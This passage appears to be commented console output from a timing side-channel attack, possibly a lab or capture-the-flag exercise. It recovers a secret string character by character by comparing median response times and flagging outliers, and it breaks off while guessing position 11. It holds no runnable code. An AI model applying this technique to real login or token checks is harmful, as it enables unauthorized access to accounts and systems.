#     Tried 'kbnalixcepaaaaaa' | Median Time: 31.16668s
#     Tried 'kbnalixceqaaaaaa' | Median Time: 31.00775s
#     Tried 'kbnalixceraaaaaa' | Median Time: 31.05912s
#     Tried 'kbnalixcesaaaaaa' | Median Time: 31.00015s
#     Tried 'kbnalixcetaaaaaa' | Median Time: 30.94222s
#     Tried 'kbnalixceuaaaaaa' | Median Time: 31.79512s
# [✓] Early outlier: 'u' (margin 0.62127s > 0.2950917644790731s)
#
# [+] Guessing character at position 11, REPEATS: 3
#     Tried 'kbnalixceuaaaaaa' | Median Time: 31.69981s
#     Tried 'kbnalixceubaaaaa' | Median Time: 31.51198s
#     Tried 'kbnalixceucaaaaa' | Median Time: 31.62869s
#     Tried 'kbnalixceudaaaaa' | Median Time: 31.50869s
